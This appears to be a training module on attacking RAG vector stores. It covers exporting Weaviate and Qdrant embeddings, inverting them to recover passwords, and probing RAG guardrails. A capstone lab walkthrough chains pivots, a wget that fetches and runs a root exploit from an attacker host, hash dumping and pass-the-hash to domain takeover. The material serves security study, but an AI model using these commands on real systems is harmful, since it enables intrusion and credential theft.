# Module 06 — Attacking Embeddings

## Overview

Embedding vectors are the numerical backbone of every RAG system, semantic search engine, and AI agent that reasons over documents. This module treats the vector store itself as an attack surface: if you can read vectors you can fingerprint the model, locate sensitive chunks without seeing the text, recover the original text through inversion, and ultimately exfiltrate secrets the RAG was trained on. Offensively, compromised embeddings give you ground truth about what a system "knows" — a pre-requisite for effective RAG poisoning (Module 05) and a stepping stone to wider network access when credentials are embedded in documents.

## Core Concepts

### What is an Embedding?

A text embedding is a fixed-length floating-point vector produced by an encoder model (e.g. `sentence-transformers/all-MiniLM-L6-v2`, BAAI/bge-*). Semantically similar texts produce geometrically similar vectors. The key properties for attackers are:

- **Dimension** — the length of the vector (e.g. 384 for MiniLM-L6, 768 for MPNet, 1536 for OpenAI ada-002). Dimension alone narrows the candidate model to a handful of families.
- **Normalization** — if `‖v‖ = 1.0` the system uses cosine similarity; if not, it may use L2. Normalized vectors are simpler to work with (dot product = cosine similarity).
- **Reversibility** — embeddings are not encrypted. Given enough candidate texts, the model, and the vector, you can find the text whose embedding is closest. This is *embedding inversion*.

### Why Vector Stores Are Exposed

Vector databases (Weaviate, Qdrant, Chroma, pgvector) typically expose an unauthenticated REST or gRPC API on internal networks. Weaviate defaults to port 8080 (HTTP) + 50051 (gRPC); Qdrant defaults to 6333 (HTTP) + 6334 (gRPC). These are rarely placed behind authentication in development/staging environments, and even in production the vector store is often on the same internal segment as application servers already accessed via pivot.

### Threat Model

```
RAG System                           Attacker
─────────────────────────────────    ────────────────────────────────────
Documents ──→ Encoder ──→ Weaviate   Step 1: Pivot to internal network
                ↓                    Step 2: Reach vector DB API
              Vectors                Step 3: Export vectors (.npy)
                                     Step 4: Fingerprint model via dimension
                                     Step 5: Triage vectors for credentials
                                     Step 6: Invert high-value vectors
                                     Step 7: Read secrets without touching docs
```

## Attack Techniques

### Technique 1 — Vector Store Enumeration

**What it is:** Listing all collections/classes in an exposed vector database to understand what data the RAG system has ingested.

**How it works:** Vector databases expose schema endpoints without authentication by default. For Weaviate, `GET /v1/schema` returns all classes; for Qdrant, `GET /collections` returns all collections.

**When to use it:** Immediately after identifying an exposed vector DB port during recon (Module 02). This tells you what documents are indexed and which collections to target.

**Example:**
```bash
# Weaviate — list all classes
curl -s http://TARGET:8080/v1/schema | python3 -m json.tool

# Qdrant — list all collections
curl -s http://TARGET:6333/collections | python3 -m json.tool

# Weaviate — check metadata (shows version, modules)
curl -s http://TARGET:8081/v1/meta | python3 -m json.tool | head -20

# Qdrant version fingerprint
curl -s http://TARGET:6333/ | python3 -m json.tool
```

**Notes / Gotchas:** Weaviate and Qdrant are both commonly deployed inside Docker with different host-facing port mappings. Check both 8080 and 8081 for Weaviate. In the capstone, Weaviate was on `127.0.0.1:8081` (localhost-only — required SSH pivot or RDP access).

---

### Technique 2 — Embedding Vector Export

**What it is:** Downloading all embedding vectors from a vector database into a local `.npy` file for offline analysis.

**How it works:** Weaviate's GraphQL API supports paginated queries with `include_vector=True`. Each page returns objects with their properties (text, title, etc.) and the raw embedding vector. Qdrant has a similar REST scroll API.

**When to use it:** After enumeration, when you want to perform offline model fingerprinting, triage, or inversion attacks.

**Example:**
```bash
# Weaviate GraphQL export — paginated
python3 weaviate_export.py --host 192.168.X.X --port 8081 \
  --collection PasswordResetPolicy --output export/
# Outputs: embeddings.npy, metadata.csv (or .parquet)

# Qdrant REST scroll export
curl -s "http://TARGET:6333/collections/docs/points/scroll" \
  -H "Content-Type: application/json" \
  -d '{"limit": 100, "with_vector": true}' | python3 -m json.tool

# Weaviate — Python client quick access
python3 << 'EOF'
import weaviate, json
client = weaviate.connect_to_local(host="localhost", port=8081, grpc_port=50051)
collection = client.collections.get("PasswordResetPolicy")
results = collection.query.fetch_objects(limit=100, include_vector=True)
output = [{"properties": dict(o.properties),
           "vector": o.vector['default'] if o.vector else None}
          for o in results.objects]
json.dump(output, open("/tmp/prp_vectors.json","w"), indent=2)
print(f"[+] {len(output)} objects exported")
client.close()
EOF
```

**Notes / Gotchas:** The `weaviate` Python client changed its API significantly between v3 and v4. For v4+ use `weaviate.connect_to_local(...)`. If connection fails, check gRPC port (50051) and whether the service is locally bound only.

---

### Technique 3 — Embedding Model Fingerprinting

**What it is:** Identifying which encoder model produced the stored vectors, without access to the application source code or config.

**How it works:** The vector dimension uniquely identifies a small family of candidate models. Layer normalization status (whether vectors sum to 1.0) confirms the likely training objective. You then load each candidate model and compute cosine similarity between probe-generated embeddings and stored vectors — the correct model produces near-1.0 similarities.

**When to use it:** After exporting vectors. Required before inversion — you cannot invert without knowing the model.

**Example:**
```python
import numpy as np

emb = np.load("embeddings.npy")

# Step 1: Check dimension → candidate models
print(f"Dimension: {emb.shape[1]}")
# 384  → all-MiniLM-L6-v2, all-MiniLM-L12-v2, paraphrase-MiniLM-L6-v2
# 768  → all-mpnet-base-v2, all-distilroberta-v1, BAAI/bge-base-en
# 1536 → text-embedding-ada-002 (OpenAI)
# 1024 → BAAI/bge-large-en-v1.5

# Step 2: Check normalization
norms = np.linalg.norm(emb, axis=1)
print(f"Mean norm: {norms.mean():.4f}")
print(f"Normalized: {np.allclose(norms, 1.0, atol=0.02)}")

# Step 3: Inference probing (inference_probe.py)
python3 inference_probe.py export/embeddings.npy \
  --url http://TARGET:8080 \
  --strategy all --deep --output probe_results.json
```

**Notes / Gotchas:** Dimension 384 is extremely common — MiniLM-L6 is the default for many open-source RAG deployments. If you have access to the system's filesystem, look for cached HuggingFace models in `/root/.cache/huggingface/hub/` or `/home/<user>/.cache/` — the directory name reveals the exact model.

```bash
find / -type d -name "*MiniLM*" 2>/dev/null
find /root/.cache -type d 2>/dev/null | head -20
```

---

### Technique 4 — Embedding Triage (chunk_triage_pipe.py)

**What it is:** A three-stage pipeline that narrows thousands of embedding vectors down to a short list most likely to contain credentials, without decoding any text.

**How it works:**
- **Stage 1 (DENSITY):** Computes pairwise k-NN density. Chunks that are semantically *isolated* from the rest of the corpus are anomalous — credentials, PII, and low-frequency content cluster separately from generic documents. Also computes cosine similarity to 12 credential-themed probe texts. Combined score narrows 449 → 50 candidates.
- **Stage 2 (PW — Contrastive):** Tests each candidate against 30 positive probes (real credential text) and 20 negative probes (policy/compliance text). Multi-alpha contrastive scoring plus k-means cluster normalization. Narrows 50 → 20.
- **Stage 3 (RECON — Inversion):** Runs shallow inversion against a 39-entry seed bank of credential-heavy sentences, then scores the decoded text against 6 CREDENTIAL_PATTERNS regexes and entropy metrics. Final ranking by combined score.
- **FUSION:** Weighted Reciprocal Rank Fusion (density:1.0, pw:1.5, recon:2.0) over stage ranks.

**When to use it:** When the vector store has hundreds of chunks and you need to prioritize which to invert.

**Example:**
```bash
# Full pipeline
python3 chunk_triage_pipe.py export/embeddings.npy

# Only density + pw stages (faster, no inversion)
python3 chunk_triage_pipe.py export/embeddings.npy --stages density,pw

# Top 20 results, save JSON
python3 chunk_triage_pipe.py export/embeddings.npy --top 20 -o pipe.json

# With company name injected into seed bank
python3 chunk_triage_pipe.py export/embeddings.npy --company megacorpone

# LLM-assisted inversion (slower, higher quality)
python3 chunk_triage_pipe.py export/embeddings.npy \
  --recon-mode llm --api-url http://TARGET:8000/v1
```

**Notes / Gotchas:** Stage 1 requires all-pairs similarity (O(n²)) — for >10,000 chunks consider chunking or reducing with `--pool-density`. The seed bank uses `{company}` placeholders — always pass `--company` for more accurate probes against a known target.

---

### Technique 5 — Embedding Inversion (Direct)

**What it is:** Recovering the approximate original text from a stored embedding vector by finding the closest text in a candidate space.

**How it works:** You encode thousands of candidate texts using the identified model, then compute cosine similarity between each candidate embedding and the target vector. The highest-scoring candidate is the likely source text (or a semantically equivalent paraphrase).

**Two strategies:**
1. **Direct encoding** — embed passwords/tokens directly: `model.encode(["TempPass09!"])`
2. **Template-based** — wrap candidates in context: `"The default password after resetting is TempPass09!"` — dramatically higher match rate because chunk text is usually a full sentence.

**When to use it:** After triage identifies the top candidate chunks. Most effective when the RAG document is a policy/onboarding document (short sentences → high inversion accuracy).

**Example:**
```python
# inversion_attack.py (offline, local model cache)
from sentence_transformers import SentenceTransformer
import numpy as np, json

model = SentenceTransformer("/path/to/cached/model")
data = json.load(open("/tmp/prp_vectors.json"))
vectors = [(d["properties"], np.array(d["vector"])) for d in data if d["vector"]]

passwords = open("/tmp/10k-most-common.txt").read().splitlines()
templates = [f"The default password after resetting is {p}" for p in passwords]

pw_emb  = model.encode(passwords,  normalize_embeddings=True)
tpl_emb = model.encode(templates,  normalize_embeddings=True)

for props, vec in vectors:
    vec /= np.linalg.norm(vec)
    top5_direct = np.argsort(pw_emb @ vec)[-5:][::-1]
    top5_tpl    = np.argsort(tpl_emb @ vec)[-5:][::-1]
    print(f"[{props.get('title','?')}]")
    for i in top5_tpl:
        print(f"  [{tpl_emb[i] @ vec:.4f}] {passwords[i]}")
```

**Notes / Gotchas:** Template strategy consistently outperforms direct encoding. Use `offline mode` (`TRANSFORMERS_OFFLINE=1`) when the model is cached locally and the target machine has no internet access.

---

### Technique 6 — Zero-Shot Template Bank Inversion (emb_fin.py)

**What it is:** A more sophisticated inversion pipeline that generates hundreds of thousands of templates across multiple domain types (credentials, PII, financial, infrastructure), then uses slot-filling to reconstruct the exact value at a specific position in the template.

**How it works:**
1. **Template generation** (`generate_templates.py`) — creates domain-aware templates with `{PASSWORD}`, `{URL}`, `{API_KEY}` slot placeholders. Generates 500k+ unique variations from pattern structures.
2. **Template scoring** — each template (with slot filled by neutral default) is scored against the target vector. Top-k templates selected using relative threshold (top-1 × 85%).
3. **Diversity clustering** — removes near-duplicate templates via greedy cosine-similarity clustering (threshold 0.85).
4. **Slot filling** — for each diverse seed template, tries every wordlist entry in the `{PASSWORD}` slot and scores against target. Two-stage narrowing: coarse pass on top-3 templates, then full tournament on the winners.
5. **Gap-based confidence** — reports `HIGH`/`MODERATE`/`LOW` based on score separation between top-1 and top-2 candidates.

**When to use it:** When direct inversion gives low-confidence results, or when the target chunk contains compound text (URL + password in the same sentence).

**Example:**
```bash
# Step 1: Generate templates
python3 generate_templates.py embeddings.npy -o templates.json --count 500000

# Step 2: Download wordlist
wget -O passwords.txt https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt

# Step 3: Run inversion
python3 emb_fin.py embeddings.npy --chunk 0 \
  --templates templates.json \
  --wordlist passwords.txt \
  --slots PASSWORD \
  --default-URL https://login.megacorpone.ai \
  --max-templates 500000
```

**Notes / Gotchas:** `--slots` specifies which placeholder to fill (PASSWORD, URL, API_KEY). Pass `--default-URL` to anchor the URL slot so only the password varies. `--all` processes every chunk; `--chunk 0` processes only the first.

---

### Technique 7 — LLM-Assisted Inversion (emb_fin RECON LLM mode)

**What it is:** Using a locally hosted LLM to iteratively generate candidate texts and scoring them against the target vector, progressively converging on the source text.

**How it works:** For each candidate chunk, the script queries an OpenAI-compatible API (Ollama, vLLM) to generate plausible enterprise document snippets. Each generation is embedded and scored against the target vector. The highest-scoring candidate is refined with additional LLM calls at progressively higher temperature, then scored for credential patterns.

**When to use it:** When the seed bank / wordlist approach fails (exotic credentials, non-password content). Requires a local LLM on the target network (Ollama is extremely common in AI lab environments).

**Example:**
```bash
# chunk_triage_pipe.py with LLM recon stage
python3 chunk_triage_pipe.py embeddings.npy \
  --stages density,pw,recon \
  --recon-mode llm \
  --api-url http://127.0.0.1:11434/v1 \
  --api-key sk-redteam \
  --generations 5
```

**Notes / Gotchas:** Ollama exposes an OpenAI-compatible API at `http://127.0.0.1:11434/v1`. List available models: `curl http://127.0.0.1:11434/api/tags`. The model ID is the first entry in `/v1/models` response. Each generation call costs 5–30 seconds — set `--generations 5` for speed.

## Tools Used

| Tool | Purpose | Basic Usage |
|------|---------|-------------|
| `weaviate` Python client | Export vectors from Weaviate | `pip install weaviate-client` |
| `weaviate_export.py` | Paginated GraphQL vector export | `python3 weaviate_export.py --host IP --collection NAME` |
| `numpy` | Load / manipulate .npy files | `np.load("embeddings.npy")` |
| `sentence-transformers` | Run candidate models for fingerprinting/inversion | `SentenceTransformer("all-MiniLM-L6-v2")` |
| `chunk_triage_pipe.py` | 3-stage credential triage pipeline | `python3 chunk_triage_pipe.py embeddings.npy` |
| `inference_probe.py` | Model fingerprinting via RAG probing | `python3 inference_probe.py emb.npy --url http://TARGET` |
| `emb_fin.py` | Template-bank slot-filler inversion | `python3 emb_fin.py emb.npy --chunk 0 --templates t.json` |
| `generate_templates.py` | Template bank generator for emb_fin | `python3 generate_templates.py emb.npy -o templates.json` |
| `inversion_attack.py` | Direct + template inversion against wordlist | `python3 inversion_attack.py` |
| `nxc`/`netexec` | SMB/WinRM credential validation | `nxc smb TARGET -u USER -p PASS` |
| `evil-winrm` | WinRM shell with hash | `evil-winrm -i TARGET -u Administrator -H HASH` |
| `xfreerdp` | RDP to Windows target | `xfreerdp /v:TARGET /u:USER /p:PASS` |
| `secretsdump.py` | Domain hash dumping | `secretsdump.py DOMAIN/USER@TARGET -hashes :HASH` |

## Lab Notes

### Capstone — researchmco.ai Embedding Attack

**Environment:**
- `192.168.X.12` — Ubuntu 24.04, AI inference stack (Weaviate, Ollama) — localhost-only services
- `192.168.X.13` — DC01, Windows Server / Active Directory, domain: `researchmco.ai`
- `192.168.X.14` — SRV1, Windows Server, Research Aggregator Portal (8080), Qdrant (6333/6334)

**Starting credential:** `ts_svc:Password1` (given at engagement start)

**Step-by-step:**

1. **Validate creds on SRV1**
   ```bash
   nxc smb 192.168.X.14 -u ts_svc -p Password1
   # Output: Pwn3d! — full SMB access
   ```

2. **RDP to SRV1 (NLA disabled)**
   ```bash
   xfreerdp /v:192.168.X.14 /u:ts_svc /p:Password1 /d:researchmco.ai \
     /dynamic-resolution /cert:ignore
   ```

3. **Enumerate Qdrant on SRV1**
   ```bash
   curl http://192.168.X.14:6333/
   # {"title":"qdrant - vector search engine","version":"1.12.4"}
   curl http://192.168.X.14:6333/collections
   ```

4. **SSH to Ubuntu via SRV1 id_rsa key**
   ```bash
   # Found: C:\Users\Administrator\.ssh\id_rsa (ts_svc key)
   # Copy to Kali, then:
   ssh -i id_rsa ts_svc@192.168.X.12
   ```

5. **Enumerate Weaviate on Ubuntu (localhost)**
   ```bash
   curl -s http://localhost:8081/v1/schema | python3 -m json.tool
   # Collections: ResearchPapers, InternalDocs, PasswordResetPolicy
   find / -type d -name "*MiniLM*" 2>/dev/null
   # Model: sentence-transformers/all-MiniLM-L6-v2
   ```

6. **Export PasswordResetPolicy vectors**
   ```bash
   python3 << 'EOF'
   import weaviate, json
   client = weaviate.connect_to_local(host="localhost", port=8081, grpc_port=50051)
   coll = client.collections.get("PasswordResetPolicy")
   results = coll.query.fetch_objects(limit=100, include_vector=True)
   data = [{"properties": dict(o.properties), "vector": o.vector['default']}
           for o in results.objects if o.vector]
   json.dump(data, open("/tmp/prp_vectors.json","w"), indent=2)
   client.close()
   EOF
   ```

7. **Run inversion attack**
   ```bash
   python3 inversion_attack.py
   # Uses TRANSFORMERS_OFFLINE=1, local model cache
   # Template "The default password after resetting is X" → high match
   # Output: password recovered
   ```

8. **Privilege escalation (Pack2TheRoot CVE-2026-41651)**
   ```bash
   # PackageKit 1.2.8-2ubuntu1.4 vulnerable (fixed in .5)
   wget http://ATTACKER/pack2theroot -O /tmp/p2r && chmod +x /tmp/p2r && /tmp/p2r
   # Result: root shell
   cat /root/rag_service/documents/MC1_password_reset.pdf
   pdftotext /root/rag_service/documents/MC1_password_reset.pdf
   ```

9. **Domain takeover from SRV1**
   ```bash
   # Dump SAM on SRV1 (RDP session)
   secretsdump.py -sam sam.bak -system sys.bak -security sec.bak LOCAL
   # Administrator NT: 4309f10ed11d9a6c42b2ed50e8689f7c
   
   # Pass-the-hash to DC01
   secretsdump.py RESEARCHMCO.AI/Administrator@DC01 \
     -hashes ':4309f10ed11d9a6c42b2ed50e8689f7c' -outputfile domain_dump
   # Dumps all domain hashes including krbtgt → Golden Ticket capable
   
   # Found in Unattend.xml: Administrator:alfpass123
   type C:\WINDOWS\Panther\Unattend.xml
   ```

**Flag/Objective:** Extract content from `/root/rag_service/documents/MC1_password_reset.pdf` on the Ubuntu host — requires root via privilege escalation after embedding inversion reveals the document path.

## Attack Chain Summary

```
Credential (ts_svc:Password1)
  → SMB validation (nxc)
  → RDP to SRV1 (xfreerdp, NLA disabled)
  → Enumerate Qdrant (curl /collections)
  → SSH pivot to Ubuntu (id_rsa from SRV1 Administrator home)
  → Enumerate Weaviate (curl localhost:8081/v1/schema)
  → Find model (find / -name "*MiniLM*")
  → Export vectors (Python weaviate client)
  → Inversion attack (inversion_attack.py → recover password)
  → Read target PDF (pdftotext)
  OR
  → PrivEsc via CVE-2026-41651 Pack2TheRoot
  → cat /root/rag_service/documents/MC1_password_reset.pdf

Parallel: SAM dump → Pass-the-Hash to DC01 → Domain compromise
```

## Cross-Module Connections

- **Module 02 (Recon):** Nmap scanning to discover Weaviate (8080/8081) and Qdrant (6333) ports is prerequisite recon for this module.
- **Module 05 (RAG Pipelines):** Understanding chunk structure from Module 05 makes the triage pipeline (chunk_triage_pipe.py) more intuitive — you're hunting the chunks that correspond to poisoned or sensitive documents.
- **Module 09 (Infrastructure):** The pivot chain here (Windows → Ubuntu via SSH key) is a canonical infrastructure lateral movement technique. LinPEAS is used to find the privesc path.
- **Module 11 (Capstone):** The full chain — pivot, vector export, fingerprint, inversion, privesc, domain dump — represents a complete multi-stage engagement combining modules 2, 6, 8 (if supply chain involved), and 9.

## Exam Gotchas

- **Dimension ≠ model.** Dimension 384 matches 15+ models. You still need probing/inference to confirm which one.
- **Offline inversion requires the model on disk.** If the target Ubuntu server has the model at `/root/.cache/huggingface/hub/models--sentence-transformers--all-MiniLM-L6-v2/snapshots/*/`, use that path directly — no internet needed. Set `TRANSFORMERS_OFFLINE=1`.
- **Template strategy beats direct encoding every time** for sentence-level chunks. "The default password after resetting is X" outperforms encoding "X" alone because the model was trained on sentence context.
- **Weaviate client v3 vs v4 API is completely different.** In labs expect v4 (`weaviate.connect_to_local()`). v3 used `weaviate.Client(url=...)`.
- **Qdrant port 6333 = REST, 6334 = gRPC.** Use REST for scripting unless the lab explicitly needs gRPC.
- **Pack2TheRoot (CVE-2026-41651)** — in the capstone this is the privesc vector on Ubuntu. Check `/usr/bin/pkcon --version` or LinPEAS output for `packagekit` version.
- **The vector export only works if the collection allows unauthenticated reads.** In production this might require a Weaviate API key. In lab environments it's typically open.

---

## Theory

### MITRE ATT&CK for ML Mappings

| Technique | ID | Description |
|---|---|---|
| Exfiltration via ML Inference API | AML.T0024 | Exfiltrating data by querying a model or vector API repeatedly |
| Membership Inference | AML.T0024.000 | Determining whether a specific input was part of training/indexed data |
| Embedding Inversion | (custom) | Reconstructing original text from stored embedding vectors |
| Attribute Inference | (custom) | Predicting metadata about a chunk owner from its embedding |

**Exam note:** AML.T0024 is the parent; AML.T0024.000 is the membership-inference sub-technique. Both apply when you enumerate a vector store and attempt to determine what documents were indexed (membership) or recover the text (exfiltration via inference).

---

### Three Attack Categories

All embedding attacks fall into one of three categories. Understanding which you are performing determines which tool and approach to select.

```
┌─────────────────────────────────────────────────────────────────────┐
│  Attack Category        │ Goal                  │ Output              │
├─────────────────────────┼───────────────────────┼─────────────────────┤
│ Embedding Inversion     │ Reconstruct text       │ Approximate source  │
│                         │ from vector            │ sentence/token      │
├─────────────────────────┼───────────────────────┼─────────────────────┤
│ Membership Inference    │ Confirm whether a      │ Yes/No + confidence │
│                         │ specific text is in    │ score               │
│                         │ the vector store       │                     │
├─────────────────────────┼───────────────────────┼─────────────────────┤
│ Attribute Inference     │ Predict metadata       │ Inferred author,    │
│                         │ about the source doc   │ department, date    │
│                         │ from its embedding     │                     │
└─────────────────────────┴───────────────────────┴─────────────────────┘
```

**Embedding Inversion** is the primary offensive technique — you recover the actual credential/secret from its vector representation without reading the source document.

**Membership Inference** is used for recon: given a known document (e.g. a password policy you obtained from a public source), confirm whether that exact text is indexed in the target RAG. Confirmation tells you the RAG has access to that document and its content can be queried.

**Attribute Inference** is a more advanced technique — embeddings from documents authored by the same person cluster together even without any text. An attacker can infer the author department, writing style, or clearance level from cluster membership.

---

### Four Inversion Approaches

Inversion approaches differ based on whether you know the model, have training data, and how much compute you can invest.

| Approach | Aliases | Model known? | Training data needed | Training time | Accuracy | When to use |
|---|---|---|---|---|---|---|
| **Zero-Shot** | ZSInvert, Zero2Text | Yes | No | None | Moderate (semantic) | Fast recon, known model, no GPU |
| **Few-Shot / ALGEN** | ALGEN, alignment generation | No (surrogate OK) | ~200–500 aligned pairs | ~2 hours | Good | Unknown model, some access to RAG query endpoint |
| **Supervised / Vec2Text** | Vec2Text | Yes | Thousands of pairs | ~60 hours | Highest | Known model, long engagement, GPU available |
| **Surrogate / Transfer** | Transfer attack | No | Surrogate model pairs | ~2–4 hours | Moderate | Unknown model, no RAG query access |

**Zero-Shot (ZSInvert / Zero2Text)**
- Works by encoding a large template bank → find the template embedding closest to the target vector
- No training required; uses the known model directly
- GPT-2 beam-search variant (zero2text_impl.py): generates text token by token, scores each beam against the target vector, uses entropy detection to trigger slot filling
- Limitation: stops at ~64 tokens; high-entropy values (random passwords) not recoverable semantically
- arXiv reference: Zero2Text arXiv 2602.01757v2

**Few-Shot / ALGEN (Alignment Generation)**
- Generates canary pairs: inject known text into RAG → query → record (query_embedding, returned_embedding) pairs → alignment matrix
- With ~200 aligned pairs, fine-tune a FlanT5-small decoder to map target_model_space → text
- Canary injection: use `rag_probe_attack.py` to extract keywords from existing RAG responses, then query with slight variations to capture more pairs
- Attack workflow: keyword extraction → RAG probing → redaction marker detection → slot filling
- Works even when the exact model is unknown — the alignment matrix adapts to whatever space the target model uses
- Requires access to the RAG query endpoint (not the vector DB directly)

**Supervised / Vec2Text**
- Two-stage architecture:
  - **Inverter**: MLP projection layer + T5-base decoder — maps embedding → approximate text
  - **Corrector**: residual-attending T5 — takes (approximate_text, original_embedding) and corrects errors iteratively
- Training: ~60 hours on GPU, requires thousands of (text, embedding) pairs from the exact target model
- Inference: ~15 minutes per chunk
- Best accuracy of all approaches; uses recon-guided template selection + progressive fill-and-lock to finalize credentials
- Only viable for long engagements where the model is definitively identified

**Surrogate / Transfer**
- When the model is unknown, train on a similar open-source model (e.g. if target is 768-dim, train on all-mpnet-base-v2)
- Transfer degrades accuracy by 15–30% vs exact model training
- Combined with ALGEN alignment matrix for domain-specific fine-tuning

---

### Inversion Limitations

Understanding what cannot be recovered is as important as knowing what can.

| Limitation | Why it matters | Mitigation |
|---|---|---|
| **Token length cap** | Inversion tools degrade past ~64 tokens (Zero2Text); RAG chunks are 256–512 tokens | Use Vec2Text for long chunks; triage to find short credential sentences within chunks |
| **High-entropy tokens** | Random passwords (e.g. `xK9!mQz#`) are not recoverable semantically — model space has no cluster for random strings | Template bank narrows to wordlist; credential regex used to detect if value is random vs. dictionary-based |
| **Model identification required** | Zero-shot and Vec2Text both require knowing the exact model | Use dimension + normalization + inference probing before attempting inversion |
| **Dimensionality reduction** | Some deployments quantize vectors (int8, 4-bit) or apply PCA → reduced fidelity | Check vector norms; if quantized, accuracy drops 10–40% |
| **Domain mismatch** | Template bank trained on generic text misses highly technical content (e.g. medical records, binary strings) | Add domain-specific templates to generate_templates.py; use `--company` flag |
| **Cosine similarity gap** | Low score gap between top-1 and top-2 templates → LOW confidence | Expand wordlist; run LLM-assisted mode; accept ambiguity |

**High-entropy password recovery path:**
- If the password matches a known wordlist (e.g. `superman`, `Password1`) → template bank will find it
- If it is random (e.g. `N0=Acc3ss`) → the character sequence is not recoverable by semantic models
- `N0=Acc3ss` is recoverable because it appears in targeted wordlists (leet substitutions of common words)
- Truly random strings (crypto-generated) are not recoverable; flag the chunk as HIGH entropy and report to client

---

### Weaviate GraphQL Cursor Pagination

Large collections (>100 objects) require paginated export. Weaviate uses an `after:` cursor (UUID-based) in its GraphQL API.

```python
import weaviate, json, numpy as np

client = weaviate.connect_to_local(host="localhost", port=8081, grpc_port=50051)
coll = client.collections.get("DocChunk")

all_objects = []
cursor = None
page = 0

while True:
    if cursor:
        results = coll.query.fetch_objects(
            limit=250,
            after=cursor,
            include_vector=True
        )
    else:
        results = coll.query.fetch_objects(
            limit=250,
            include_vector=True
        )
    
    batch = results.objects
    if not batch:
        break
    
    all_objects.extend(batch)
    cursor = batch[-1].uuid  # UUID of last object = next page cursor
    page += 1
    print(f"[+] Page {page}: {len(batch)} objects (total {len(all_objects)})")

# Save
vectors = np.array([o.vector['default'] for o in all_objects if o.vector])
np.save("embeddings.npy", vectors)
ids     = [str(o.uuid) for o in all_objects if o.vector]
texts   = [o.properties.get('text','') for o in all_objects if o.vector]
print(f"[+] Saved {vectors.shape[0]} vectors, dim={vectors.shape[1]}")
client.close()
```

**Key points:**
- `after=cursor` uses the UUID of the last object fetched as the page token
- Loop terminates when `batch` is empty (no more objects)
- `limit=250` is safe; Weaviate soft-caps at 10,000 per page but larger batches increase memory pressure
- Output: `embeddings.npy` (shape: N×384), chunk IDs, UUID list, optional CSV/Parquet

---

### Qdrant Scroll API Export

Qdrant uses a REST POST scroll endpoint with `next_page_offset` for pagination.

```bash
# Single page (with vectors)
curl -s "http://TARGET:6333/collections/docs/points/scroll" \
  -H "Content-Type: application/json" \
  -d '{"limit": 100, "with_vector": true, "with_payload": true}' \
  | python3 -m json.tool

# Paginated export (Python)
python3 << 'EOF'
import requests, numpy as np, json

BASE = "http://TARGET:6333"
COLL = "docs"
LIMIT = 250
offset = None
all_pts = []

while True:
    body = {"limit": LIMIT, "with_vector": True, "with_payload": True}
    if offset:
        body["offset"] = offset
    r = requests.post(f"{BASE}/collections/{COLL}/points/scroll", json=body)
    data = r.json()["result"]
    pts = data["points"]
    if not pts:
        break
    all_pts.extend(pts)
    offset = data.get("next_page_offset")
    print(f"[+] {len(all_pts)} points collected")
    if not offset:
        break

vectors = np.array([p["vector"] for p in all_pts])
np.save("qdrant_embeddings.npy", vectors)
print(f"[+] {vectors.shape} saved")
EOF
```

**Key points:**
- `next_page_offset` in the result is the offset for the next page (None = done)
- REST port 6333; gRPC port 6334 (use REST for scripting)
- `with_payload: true` includes the stored text/metadata alongside the vector

---

### Embedding Model Fingerprinting — Full CANDIDATE_MODELS

The `inference_probe.py` script uses this candidate model dictionary internally. Knowing it lets you manually narrow candidates before running the script.

| Dimension | Candidate Models |
|---|---|
| 384 | `sentence-transformers/all-MiniLM-L6-v2`, `sentence-transformers/all-MiniLM-L12-v2`, `sentence-transformers/paraphrase-MiniLM-L6-v2`, `BAAI/bge-small-en-v1.5` |
| 768 | `sentence-transformers/all-mpnet-base-v2`, `sentence-transformers/all-distilroberta-v1`, `BAAI/bge-base-en-v1.5`, `sentence-transformers/multi-qa-mpnet-base-dot-v1` |
| 1024 | `BAAI/bge-large-en-v1.5`, `sentence-transformers/paraphrase-multilingual-mpnet-base-v2` |
| 1536 | `text-embedding-ada-002` (OpenAI), `text-embedding-3-small` (OpenAI) |
| 3072 | `text-embedding-3-large` (OpenAI) |

**Fingerprinting workflow:**
1. Export vectors → check `embeddings.shape[1]` → candidate list
2. Check normalization → `np.allclose(norms, 1.0)` → confirms cosine-trained model
3. `find / -name "*MiniLM*" 2>/dev/null` → cached model path on target
4. Load each candidate → encode probe text → compute cosine similarity to stored vector
5. Correct model: similarity ≥ 0.995; wrong model: similarity ≤ 0.7

```python
# Manual inference probing (no script needed)
from sentence_transformers import SentenceTransformer
import numpy as np

target_vec = np.load("embeddings.npy")[0]  # first chunk to probe
probe_text = "This document contains the password reset policy."

for model_name in ["all-MiniLM-L6-v2", "all-mpnet-base-v2", "BAAI/bge-base-en-v1.5"]:
    try:
        m = SentenceTransformer(model_name)
        probe_vec = m.encode([probe_text], normalize_embeddings=True)[0]
        sim = float(probe_vec @ target_vec)
        print(f"[{sim:.4f}] {model_name}")
    except Exception as e:
        print(f"[FAIL] {model_name}: {e}")
```

---

### ALGEN — Canary Injection Theory

ALGEN (Alignment Generation) bridges the gap when you cannot identify the exact model. The key insight: if you can inject known text into the RAG and then query it, you can observe the relationship between the text and its embedding — even without direct model access.

**Canary Injection vs Synthetic Alignment:**

| Method | How pairs are generated | Quality | Requires |
|---|---|---|---|
| Canary injection | Inject known text → query → record embedding | High (real model pairs) | Write access to RAG ingestion |
| Synthetic alignment | Use surrogate model to generate pairs | Moderate (distribution shift) | Surrogate model only |
| RAG probing | Query RAG with known text → extract returned chunk embeddings | Medium | Query access only |

**RAG probe attack workflow (rag_probe_attack.py):**
1. **Keyword extraction**: parse existing RAG responses → extract domain keywords (company names, product names, policy terms)
2. **Probe generation**: craft queries embedding those keywords in varied sentence structures
3. **Query and record**: submit each probe → capture returned chunk text + embedding via API instrumentation
4. **Redaction marker detection**: if RAG output-guardrails redact `[REDACTED]` tokens, infer the chunk contained sensitive content at that position → targeted slot filling
5. **Slot filling**: for redacted positions, try wordlist entries → score against captured embedding

**FlanT5-small decoder training:**
- Input: embedding vector (384-dim) projected to T5 hidden dim via learned MLP
- Output: text token sequence
- Training: (embedding, text) pairs from canary injection
- ~2 hours on CPU, ~20 min on GPU
- After training: `model.generate(embedding_input)` → approximate text

---

### Vec2Text — Two-Stage Architecture

Vec2Text is the highest-accuracy inversion approach. It trains two models: an **inverter** (coarse reconstruction) and a **corrector** (iterative refinement).

```
Target Embedding (384-dim)
        │
        ▼
┌───────────────────┐
│  MLP Projection   │  384 → T5 hidden dim (768)
└────────┬──────────┘
         │
         ▼
┌───────────────────┐
│  T5-base Inverter │  Beam search → approximate text (seq2seq)
│  (Coarse)         │  Output: "The default password is [MASK]"
└────────┬──────────┘
         │
         ▼ (approx text + original embedding)
┌───────────────────┐
│  T5-base Corrector│  Residual-attending: reads approx_text + embedding delta
